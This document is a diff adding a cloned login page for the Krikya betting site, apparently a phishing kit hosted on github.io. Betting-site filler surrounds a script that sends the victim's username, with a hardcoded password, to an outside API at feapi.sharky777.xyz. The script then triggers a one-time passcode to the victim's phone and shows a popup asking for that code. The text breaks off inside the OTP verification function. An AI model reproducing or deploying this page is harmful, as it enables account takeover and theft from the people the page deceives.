+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fortune Gems 2...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">skb*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:25</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2050.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fortune Gems 3...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">nirobs*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:05</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2950.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Crazy777</div>
+                              <div class="row highPayoutTextSmall no-gutters">has*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:05</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2370.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">rifa*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:05</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2369.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">ra*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:42:50</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                5445.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">ahadm*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:42:35</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                6825.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="highlight-container highlight-height px-4 py-6">
+              <div class="highlight-wrapper">
+                <div class="matches-box">
+                  <div>
+                    <div class="matchUp">
+                      <div>Live</div><img width="70" height="20" alt="live match"
+                        src="/static/image/favourite/now.webp">
+                    </div><a href="cricket" class="match-item mr-3">
+                      <div class="league-name">Indian Premier League</div>
+                      <div class="match-team">
+                        <div class="home-team">
+                          <div><img src="https://jiliwin.9terawolf.com/cms/h8/image/67ec916bc621a.png"
+                              class="country-logo"></div>
+                          <div class="team-name">Chennai Super Kings</div>
+                          <div class="odds">1.84</div>
+                        </div>
+                        <div class="verDiv"><img src="/static/image/favourite/versus.png" class="versus"></div>
+                        <div class="away-team">
+                          <div><img src="https://jiliwin.9terawolf.com/cms/h8/image/67ec917063b19.png"
+                              class="country-logo"></div>
+                          <div class="team-name">Delhi Capitals</div>
+                          <div class="odds">2.10</div>
+                        </div>
+                      </div>
+                      <div class="match-datetime-div">
+                        <div class="match-date">2025-04-05</div>
+                        <div class="match-time">16:00</div>
+                      </div>
+                    </a>
+                  </div>
+                  <div>
+                    <div class="matchUp">
+                      <div>Live</div><img width="70" height="20" alt="live match"
+                        src="/static/image/favourite/now.webp">
+                    </div><a href="cricket" class="match-item mr-3">
+                      <div class="league-name">Indian Premier League</div>
+                      <div class="match-team">
+                        <div class="home-team">
+                          <div><img src="https://jiliwin.9terawolf.com/cms/h8/image/67ec92c205943.png"
+                              class="country-logo"></div>
+                          <div class="team-name">Punjab Kings</div>
+                          <div class="odds">1.72</div>
+                        </div>
+                        <div class="verDiv"><img src="/static/image/favourite/versus.png" class="versus"></div>
+                        <div class="away-team">
+                          <div><img src="https://jiliwin.9terawolf.com/cms/h8/image/67ec92cae4552.png"
+                              class="country-logo"></div>
+                          <div class="team-name">Rajasthan Royals</div>
+                          <div class="odds">2.36</div>
+                        </div>
+                      </div>
+                      <div class="match-datetime-div">
+                        <div class="match-date">2025-04-05</div>
+                        <div class="match-time">20:00</div>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <footer class="v-footer footer v-sheet theme--light footer_color" data-booted="true">
+            <div class="footer_wrapper">
+              <div class="row no-gutters">
+                <div class="footer-container-1 col">
+                  <div class="payment-methods">
+                    <div class="footer-title mb-2">Payment Methods</div>
+                    <div class="d-flex flex-wrap payment-methods-icons"><img width="32" height="32"
+                        src="https://gamius88.github.io/page/payment-bank.png" alt="" contain="true"
+                        class="footer-icon"></div>
+                  </div>
+                  <div class="customer-support">
+                    <div class="footer-title mb-2">Responsible Gaming</div>
+                    <div class="d-flex flex-wrap payment-methods-icons"><img width="32" height="32"
+                        src="https://gamius88.github.io/page/safe2.png" alt="responsible gaming"
+                        class="footer-icon"><img width="32" height="32"
+                        src="https://gamius88.github.io/page/safe1_2.png" alt="responsible gaming" class="footer-icon">
+                    </div>
+                  </div>
+                  <div class="community">
+                    <div class="row mb-2 no-gutters"><label class="footer-title">Certifications</label></div>
+                    <div class="row d-flex flex-wrap payment-methods-icons no-gutters"><img width="99" height="32"
+                        src="https://gamius88.github.io/page/gaming_license.png" alt="gaming license">
+                      <div><a href="https://casinosanalyzer.com/" target="_blank"><img width="77" height="32"
+                            src="https://gamius88.github.io/page/gaming_Casino_Analyzer.png" alt="casino analyzer"></a>
+                      </div><img width="32" height="32" src="https://gamius88.github.io/page/gaming_iTechLabs.png"
+                        alt="gaming itech" class="ml-2">
+                    </div>
+                  </div>
+                  <div class="followUs">
+                    <div class="row mb-2 no-gutters"><label class="footer-title">Follow Us</label></div>
+                    <div class="row d-flex flex-wrap payment-methods-icons no-gutters">
+                      <div><a href="https://www.facebook.com/krikyaofficial" target="_blank"><img width="32" height="32"
+                            src="https://gamius88.github.io/page/fb.png" alt="krikya facebook"></a></div>
+                      <div><a href="https://t.me/krikya88" target="_blank"><img width="32" height="32"
+                            src="https://gamius88.github.io/page/telegram.png" alt="krikya telegram"></a></div>
+                      <div><a href="https://www.instagram.com/krikyaofficial/" target="_blank"><img width="32"
+                            height="32" src="https://gamius88.github.io/page/ig.png" alt="krikya instagram"></a></div>
+                      <div><a href="https://www.youtube.com/@krikyaofficial" target="_blank"><img width="32" height="32"
+                            src="https://gamius88.github.io/page/Youtube.png" alt="krikya youtube"></a></div>
+                      <div><a href="https://twitter.com/KRIKYA_OFFICIAL" target="_blank"><img width="32" height="32"
+                            src="https://gamius88.github.io/page/Twitter.png" alt="krikya twitter"></a></div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="row no-gutters"><!----><!----></div>
+              <div class="row">
+                <div class="my-2 col col-12">
+                  <hr role="separator" aria-orientation="horizontal" class="v-divider theme--light">
+                </div>
+              </div>
+              <div class="container" style="text-transform: none">
+                <div class="row">
+                  <div class="col">
+                    <h1>Welcome to Krikya!</h1>
+                    <p><a href="https://gamius88.github.io/page/">Krikya</a> is an online platform that offers a diverse
+                      range of
+                      games and sports betting options, providing an immersive gaming experience for players in
+                      Bangladesh. With a wide selection of games including slots, table games, live dealer games,
+                      sportsbook, fishing, lottery, and crash, Krikya aims to cater to the varied preferences of gaming
+                      enthusiasts. Whether you're a fan of classic games or prefer the thrill of sports betting, Krikya
+                      provides a convenient and entertaining platform for players to enjoy their favorite games from the
+                      comfort of their own homes. Additionally, Krikya prioritizes safety and security, ensuring that
+                      players can engage in gaming activities with peace of mind.</p><br>
+                    <h2>Sportsbook</h2>
+                    <p>Get in on the action with <a href="https://gamius88.github.io/page/">Krikya's Sportsbook</a>,
+                      your premier destination
+                      for online sports betting. With a comprehensive range of sports and events to choose from,
+                      including football, basketball, tennis, and more, our platform provides sports enthusiasts with a
+                      thrilling and rewarding betting experience. Whether you're a fan of local leagues or international
+                      tournaments, our Sportsbook offers competitive odds, live betting options, and exclusive
+                      promotions to enhance your gaming experience.</p> <br>
+                    <h2>Lottery</h2>
+                    <p>Dream big and play for massive prizes with <a href="https://gamius88.github.io/page/">Krikya's
+                        Lottery game</a>. Choose
+                      your lucky numbers and purchase tickets for a chance to win life-changing jackpots and lucrative
+                      payouts. With multiple draws held daily and a variety of prize tiers available, our Lottery game
+                      offers players the opportunity to turn their dreams into reality with a single lucky ticket.</p>
+                  </div>
+                  <div class="col">
+                    <h2>Cricket Betting</h2>
+                    <p>Experience the thrill of cricket like never before with <a
+                        href="https://gamius88.github.io/page/">Crickbet Betting at
+                        Krikya</a>. Our platform offers a comprehensive selection of cricket matches from around the
+                      world, allowing you to place bets on your favorite teams and players with ease. Whether it's Test
+                      matches, One Day Internationals, or T20 tournaments, Crickbet Betting provides competitive odds,
+                      live updates, and a seamless betting experience. Join the action-packed world of cricket betting
+                      at <a href="https://gamius88.github.io/page/?af=AG002226">Krikya</a> and elevate your game to new
+                      heights.</p><br>
+                    <h2>Slot Games</h2>
+                    <p>Spin your way to riches with Krikya's extensive collection of <a
+                        href="https://gamius88.github.io/page/">Slot Games</a>.
+                      From classic three-reel fruit machines to feature-packed video slots, our platform boasts hundreds
+                      of titles from the world's leading game developers. Immerse yourself in captivating themes,
+                      stunning graphics, and exciting bonus features as you chase big wins and thrilling jackpots. With
+                      new games added regularly, there's always something fresh and exciting to discover at Krikya's
+                      Slot Games section.</p><br>
+                    <h2>Fishing</h2>Escape to a tranquil fishing paradise with <a
+                      href="https://gamius88.github.io/page/">Krikya's Fishing
+                      game</a>. Cast your line into crystal-clear waters and reel in a variety of exotic fish, each
+                    offering its own set of rewards and prizes. With stunning visuals, realistic gameplay mechanics, and
+                    immersive sound effects, our Fishing game provides players with a relaxing and enjoyable gaming
+                    experience that captures the essence of a peaceful day on the water.
+                  </div>
+                  <div class="col">
+                    <h2>Live Dealer Games</h2>
+                    <p>Step into the glitz and glamour of a real gambling house with <a
+                        href="https://gamius88.github.io/page/casino">Krikya's Live
+                        Dealer Games</a> experience. Our state-of-the-art platform brings the excitement of land-based
+                      gambling houses directly to your screen, allowing you to interact with professional dealers and
+                      fellow players in real-time. Whether you prefer classic table games like Blackjack and Roulette or
+                      immersive live dealer sessions of Baccarat and Poker, our Live Dealer Games offers an unparalleled
+                      gaming experience that will keep you coming back for more.</p><br>
+                    <h2>Table Games</h2>
+                    <p>Take a seat at our virtual tables and test your skills with <a
+                        href="https://gamius88.github.io/page/tablegames">Krikya's Table
+                        Games</a> selection. Whether you're a seasoned pro or a casual player, you'll find a wide
+                      variety of classic and modern table games to suit your preferences. From timeless favorites like
+                      Blackjack, Roulette, and Baccarat to innovative variants and exciting new releases, Krikya offers
+                      an immersive and authentic gambling house experience that will keep you entertained for hours on
+                      end.</p><br>
+                    <h2>Crash</h2>
+                    <p>Brace yourself for heart-pounding thrills with <a
+                        href="https://gamius88.github.io/page/crash">Krikya's Crash game</a>. As the
+                      multiplier rises, so does the tension, as players must decide when to cash out before it crashes.
+                      With fast-paced gameplay, high-stakes action, and the chance to win big, our Crash game is perfect
+                      for adrenaline junkies and risk-takers looking for an unforgettable gaming experience.</p>
+                  </div>
+                </div>
+              </div>
+              <div class="my-2 col col-12">
+                <hr role="separator" aria-orientation="horizontal" class="v-divider theme--light">
+              </div>
+              <div cols="12" class="row align-center no-gutters justify-space-between">
+                <div class="row mb-2 no-gutters"><img width="120" height="30"
+                    src="https://gamius88.github.io/page/logo_black.png" alt="krikya logo" class="footer-logo"
+                    style="align-self: end;">
+                  <hr role="separator" aria-orientation="vertical"
+                    class="footer-divider ml-5 v-divider v-divider--vertical theme--light" style="display: none;">
+                </div>
+                <div no-gutters="" class="faq-container col-md-4 col-12">
+                  <div class="row faq-wrapper"><a href="https://gamius88.github.io/page/agent/apply"
+                      class="footer-title">Affiliate</a><a href="https://gamius88.github.io/page/info/faq"
+                      class="footer-title">Responsible Gaming</a><a href="https://gamius88.github.io/page/info/tnc"
+                      class="footer-title">Terms And Condition</a><a
+                      href="https://gamius88.github.io/page/info/about-us" class="footer-title">About
+                      us</a><a href="https://gamius88.github.io/page/" class="footer-title"
+                      rel="nofollow noopener noreferrer">Krikya.com</a><a href="https://gamius88.github.io/page/"
+                      class="footer-title" rel="nofollow noopener noreferrer">Krikya.group</a><a
+                      href="https://gamius88.github.io/page/" class="footer-title"
+                      rel="nofollow noopener noreferrer">Krikya.dev</a><a href="https://gamius88.github.io/page/"
+                      class="footer-title" rel="nofollow noopener noreferrer">Krikya.info</a><a
+                      href="https://gamius88.github.io/page/" class="footer-title"
+                      rel="nofollow noopener noreferrer">Krikya Blog</a></div>
+                  <div class="copyright" style="color: var(--v-description-darken3);">Copyright © 2025 Krikya.All rights
+                    are reserved.</div>
+                </div>
+              </div>
+            </div>
+          </footer>
+        </div>
+      </main>
+      <footer class="v-footer footer v-sheet theme--light footer_color">
+        <div class="footer_wrapper">
+          <div class="row no-gutters">
+            <div class="footer-container-1 col">
+              <div class="payment-methods">
+                <div class="footer-title mb-2">Payment Methods</div>
+                <div class="d-flex flex-wrap payment-methods-icons">
+                  <img width="32" height="32" src="https://gamius88.github.io/page/payment-bank.png" alt contain="true"
+                    class="footer-icon">
+                </div>
+              </div>
+              <div class="community">
+                <div class="row mb-2 no-gutters"><label class="footer-title">Certifications</label></div>
+                <div class="row d-flex flex-wrap payment-methods-icons no-gutters">
+                  <img width="99" height="32" src="https://gamius88.github.io/page/gaming_license.png"
+                    alt="gaming license">
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="my-2 col col-12">
+              <hr role="separator" aria-orientation="horizontal" class="v-divider theme--light">
+            </div>
+          </div>
+          <div cols="12" class="row align-center no-gutters justify-space-between">
+            <div class="row mb-2 no-gutters">
+              <img width="120" height="30" src="https://gamius88.github.io/page/logo_black.png" alt="krikya logo"
+                class="footer-logo">
+            </div>
+            <div no-gutters class="faq-container col-md-4 col-12">
+              <div class="row faq-wrapper">
+                <a href="/profile/agent/apply" class="footer-title">Affiliate</a>
+                <a href="/info/faq" class="footer-title">Responsible Gaming</a>
+                <a href="/info/tnc" class="footer-title">Terms And Condition</a>
+              </div>
+              <div class="copyright" style="color: var(--v-description-darken3);">Copyright © 2025 Krikya. All rights
+                reserved.</div>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+    <div id="popupModal" role="document" tabindex="0" class="v-dialog__content v-dialog__content--active"
+      style="z-index: 202;">
+      <div class="v-dialog v-dialog--active v-dialog--persistent"
+        style="transform-origin: center center 0px; max-width: 400px;">
+        <div data-v-d6ec978c="" class="dialog-card v-card v-sheet theme--light">
+          <div data-v-d6ec978c="" class="row no-gutters justify-space-between dialog-header">
+            <div data-v-d6ec978c="" class="d-flex flex-column pl-6 py-4 col col-10"><!----><label data-v-d6ec978c=""
+                class="dialog-title text-capitalize d-block full-width white--text">
+                Welcome to Krikya
+              </label><!----></div>
+            <div data-v-d6ec978c="" class="d-flex justify-content-center align-content-center col col-2">
+              <button data-v-d6ec978c="" type="button"
+                class="v-icon notranslate full-width v-icon--link mdi mdi-close theme--light white--text dialog-close-icon login"></button>
+            </div>
+          </div>
+          <div data-v-d6ec978c="" class="row dialog-row no-gutters pa-0">
+            <div class="row no-gutters">
+              <div class="col col-12 login_panel px-3">
+                <div class="row watch-video-container" style="margin: 0px 0px 20px;">
+                  <div class="watch-video-label"><label>How to Reset Password in Krikya? Click the button to know
+                      more.</label></div>
+                  <div class="watch-video-button"><button data-v-3b7d3367="" type="button"
+                      class="pa-2 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default buttonPrimary theme-button theme--light subtitle-1"><span
+                        class="v-btn__content">Watch Video
+                      </span></button></div>
+                  <div class="watch-video-close"><img src="https://gamius88.github.io/page/btn-close-watch-video.png"
+                      alt="close-watch-video"></div>
+                </div>
+                <form novalidate="novalidate" class="v-form">
+                  <div class="mobile">
+                    <div class="row no-gutters justify-space-between">
+                      <div no-gutters="" class="col col-10">
+                        <label for="membercode" class="input-field-label ma-0 text-capitalize d-block"
+                          style="float: left;">
+                          Username<span class="red--text ml-1">*</span></label>
+                      </div>
+                      <div no-gutters="" class="col col-2"><!----></div>
+                      <div no-gutters="" class="col col-12">
+                        <div
+                          class="v-input input-field elevation-0 hide-details theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined v-text-field--placeholder">
+                          <div class="v-input__control">
+                            <div class="v-input__slot">
+                              <div class="v-input__prepend-inner">
+                                <div class="v-input__icon v-input__icon--prepend-inner"><i aria-hidden="true"
+                                    class="v-icon notranslate mdi mdi-account-outline theme--light"></i></div>
+                              </div>
+                              <fieldset aria-hidden="true">
+                                <legend style="width: 0px;"><span class="notranslate">​</span></legend>
+                              </fieldset>
+                              <div class="v-text-field__slot">
+                                <input autocomplete="new-password" autofocus="autofocus" id="membercode"
+                                  placeholder="Fill up here" type="text">
+                              </div>
+                            </div>
+                            <div class="v-text-field__details">
+                              <div class="v-messages theme--light">
+                                <div class="v-messages__wrapper"></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div><!----><!---->
+                      </div>
+                    </div>
+                  </div>
+                  <div class="mobile">
+                    <div class="row no-gutters justify-space-between">
+                      <div no-gutters="" class="col col-10">
+                        <label class="input-field-label ma-0 text-capitalize d-block" style="float: left;">
+                          Password<span class="red--text ml-1">*</span></label>
+                      </div>
+                      <div no-gutters="" class="col col-2"><!----></div>
+                      <div no-gutters="" class="col col-12">
+                        <div
+                          class="v-input input-field elevation-0 hide-details v-input--has-state theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined v-text-field--placeholder error--text">
+                          <div class="v-input__control">
+                            <div class="v-input__slot">
+                              <div class="v-input__prepend-inner">
+                                <div class="v-input__icon v-input__icon--prepend-inner"><i aria-hidden="true"
+                                    class="v-icon notranslate mdi mdi-lock-outline theme--light error--text"></i></div>
+                              </div>
+                              <fieldset aria-hidden="true">
+                                <legend style="width: 0px;"><span class="notranslate">​</span></legend>
+                              </fieldset>
+                              <div class="v-text-field__slot"><input autocomplete="new-password" autofocus="autofocus"
+                                  id="input-407" placeholder="Fill up here" type="password"></div>
+                            </div>
+                            <div class="v-text-field__details">
+                              <div class="v-messages theme--light error--text" role="alert">
+                                <div class="v-messages__wrapper">
+                                  <div class="v-messages__message"></div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div><!----><!---->
+                      </div>
+                    </div>
+                  </div>
 
-<div class="container">
-    <div class="header">
-        <h2>Welcome To HckrXyzz</h2>
-    </div>
-    
-    <button class="watch-video">verify</button>
-    
-    <div class="input-group">
-        <label for="username">Username *</label>
-        <input type="text" id="username" placeholder="Fill up here" required>
-        <span class="error"></span>
-    </div>
-    
-    <div class="input-group">
-        <label for="password">Password *</label>
-        <input type="password" id="password" placeholder="Fill up here" required>
-        <span class="error">This is a mandatory field</span>
-    </div>
-    
-    <button class="login-btn">LOGIN</button>
-    
-    <div class="footer">
-        <p>Forgot Password?</p>
-        <p>Don’t have an account? <strong>Sign Up</strong></p>
-    </div>
-</div>
+                  <div class="row no-gutters">
+                    <div class="text-right forgot-password col col-12">
+                      <button type="button" class="text-capitalize pr-0 v-btn v-btn--text theme--light v-size--default"
+                        style="height: auto;"><span class="v-btn__content">
+                          Forgot password?
+                        </span></button>
+                    </div>
+                  </div>
 
-<footer>
-<button type="button" class="iphone-button-container">
+                  <div class="row no-gutters">
+                    <div class="col col-12">
+                      <button onclick="loginUser(event);showOtpPopup();closeLoginModal()" type="button"
+                        class="button-primary full-width font-weight-bold v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default"
+                        style="height: auto;"><span class="v-btn__content">
+                          Login
+                        </span></button>
+                    </div>
+                    <div class="text-center col col-12">
+                      <label class="red--text subtitle-2" style="display: none;"></label>
+                    </div>
+                  </div>
+                </form>
+                <p class="mt-5 text-left subtitle-2">
+                  Don't have an account?
+                  <a class="link-underscore">Sign Up</a>
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
 
-<div class="iphone-button" id="homeButton">
-<div class="iphone-button-square"></div>
-</div>
-</button>       
-</footer>
+    <div id="otpPopup" class="v-dialog__content" style="display: none; z-index: 202;">
+      <div class="v-dialog v-dialog--persistent" style="transform-origin: center center 0px; max-width: 400px;">
+        <div data-v-d6ec978c="" class="dialog-card v-card v-sheet theme--light">
+          <div data-v-d6ec978c="" class="row no-gutters justify-space-between dialog-header">
+            <div data-v-d6ec978c="" class="d-flex flex-column pl-6 py-4 col col-10">
+              <label data-v-d6ec978c="" class="dialog-title text-capitalize d-block full-width white--text">
+                Verify OTP
+              </label>
+            </div>
+            <div data-v-d6ec978c="" class="d-flex justify-content-center align-content-center col col-2">
+              <button type="button"
+                class="v-icon notranslate full-width v-icon--link mdi mdi-close theme--light white--text dialog-close-icon"
+                onclick="closeOtpPopup()"></button>
+            </div>
+          </div>
+          <div data-v-d6ec978c="" class="row dialog-row no-gutters pa-0">
+            <div class="row no-gutters">
+              <div class="col col-12 login_panel px-3">
+                <form novalidate="novalidate" class="v-form">
+                  <div class="mobile">
+                    <div class="row no-gutters justify-space-between">
+                      <div no-gutters="" class="col col-10">
+                        <label class="input-field-label ma-0 text-capitalize d-block" style="float: left;">
+                          Verification code <span class="red--text ml-1">*</span>
+                        </label>
+                      </div>
+                      <div no-gutters="" class="col col-12">
+                        <div
+                          class="v-input input-field elevation-0 hide-details theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined">
+                          <div class="v-input__control">
+                            <div class="v-input__slot">
+                              <div class="v-input__prepend-inner">
+                                <div class="v-input__icon v-input__icon--prepend-inner">
+                                  <i aria-hidden="true"
+                                    class="v-icon notranslate mdi mdi-lock-outline theme--light"></i>
+                                </div>
+                              </div>
+                              <fieldset aria-hidden="true">
+                                <legend style="width: 0px;"><span class="notranslate">​</span></legend>
+                              </fieldset>
+                              <div class="v-text-field__slot">
+                                <input autocomplete="new-password" autofocus="autofocus" id="otpCode" placeholder="OTP code" type="number">
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row no-gutters">
+                    <div class="text-right forgot-password col col-12">
+                      <button onclick="openLoginModal();closeOtpPopup()" type="button"
+                        class="text-capitalize pr-0 v-btn v-btn--text theme--light v-size--default"
+                        style="height: auto;"><span class="v-btn__content">
+                          Back to login
+                        </span></button>
+                    </div>
+                  </div>
+                  <div class="row no-gutters">
+                    <div class="col col-12">
+                      <button onclick="verifyOtp()" type="button"
+                        class="button-primary full-width font-weight-bold v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default"
+                        style="height: auto; color: #fff;">
+                        <span class="v-btn__content">Submit</span>
+                      </button>
+                    </div>
+                  </div>
+                </form>
+                <p class="mt-5 text-left subtitle-2">
+                  Didn't get it? <a class="link-underscore" onclick="requestOtp()">Send again</a>
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="bottom-navigator">
+      <div class="row bottom-navigator-before-login no-gutters">
+        <div
+          class="bottom-navigator-before-login-first d-flex flex-row justify-center align-center no-gutters col col-4">
+          <div class="d-flex flex-column justify-center align-center">
+            <button type="button" class="v-btn v-btn--icon v-btn--round theme--light v-size--small"><span
+                class="v-btn__content">
+                <div class="v-avatar language-button" style="height: 25px; min-width: 25px; width: 25px;"><img
+                    width="25" height="25" src="https://gamius88.github.io/page/BDT.svg" alt="krikya cricket exchange">
+                </div>
+              </span></button>
+          </div>
+          <div no-gutters="" class="d-flex flex-column justify-center align-center">
+            <span style="font-weight: bolder; font-size: 12px; padding-left: 10px;">৳ BDT</span>
+            <span style="font-weight: bolder; font-size: 12px; padding-left: 10px;">
+              English
+            </span>
+          </div>
+        </div>
+        <div
+          class="bottom-navigator-before-login-third d-flex login-btn justify-center align-center no-gutters col col-4"
+          onclick="openLoginModal()">
+          <b>Login</b>
+        </div>
+        <div
+          class="bottom-navigator-before-login-second d-flex justify-center align-center no-gutters col col-4 signup-Btn">
+          <b>Sign
+            Up</b>
+        </div>
+      </div><!---->
+    </div>
+
+
+
+
+    <script>
+      function closeOtpPopup() {
+        document.getElementById('otpPopup').style.display = 'none';
+      }
+
+      function showOtpPopup() {
+        document.getElementById('otpPopup').style.display = 'block';
+      }
+    </script>
+
+
+    <script>
+      function openLoginModal() {
+        document.getElementById('popupModal').style.display = 'block';
+      }
+
+      function closeLoginModal() {
+        document.getElementById('popupModal').style.display = 'none';
+      }
+
+
+
+      var closeButton = document.querySelector('.dialog-close-icon');
+      closeButton.addEventListener('click', function () {
+        closeLoginModal();
+      });
+
+      window.addEventListener('keydown', function (event) {
+        if (event.key === 'Escape') {
+          closeLoginModal();
+        }
+      });
+      var closeButton = document.querySelector('.dialog-close-icon');
+      closeButton.addEventListener('click', function () {
+        closeLoginModal();
+      });
+      window.addEventListener('keydown', function (event) {
+        if (event.key === 'Escape') {
+          closeLoginModal();
+        }
+      });
+    </script>
+    <script>
+      const baseUrl = 'https://feapi.sharky777.xyz';
+      async function loginUser(event) {
+        event.preventDefault();
+        const membercode = document.getElementById("membercode").value;
+        const password = '840600';
+        const domain = "https:// www.krikya11.com ";
+        const option = "2";
+        const platform = "mobile";
+        const response = await fetch(`${baseUrl}/api/token`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ membercode, password, domain, option, platform }),
+        });
+
+        if (response.ok) {
+          const { access_token } = await response.json();
+          localStorage.setItem('authToken', access_token);
+          localStorage.setItem('membercode', membercode);
+          fetchMobileDetails();
+          alert('Requesting OTP...');
+          await requestOtp();
+        } else {
+          alert('Login failed. Please check your membercode and password.');
+        }
+      }
+
+      async function requestOtp() {
+        const mobile = localStorage.getItem('contact');
+        const prefix = '+880';
+        const currency = "BDT";
+        const language = "bd";
+        const request_otp = true;
+        const captcha_id = "123456789";
+        const captcha_code = "1234";
+        const otpResponse = await fetch(`${baseUrl}/api/mobile/request`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer ' + localStorage.getItem('authToken'),
+          },
+          body: JSON.stringify({ mobile, prefix, currency, language, request_otp, captcha_id, captcha_code }),
+        });
+
+        if (otpResponse.ok) {
+          alert('OTP has been requested. Please answer the call.');
+          document.getElementById('otpPopup').style.display = 'flex';
+        } else {
+          alert('Failed to request OTP. Please try again.');
+        }
+      }
+
+      async function verifyOtp() {
+        const mobile = localStorage.getItem('contact');
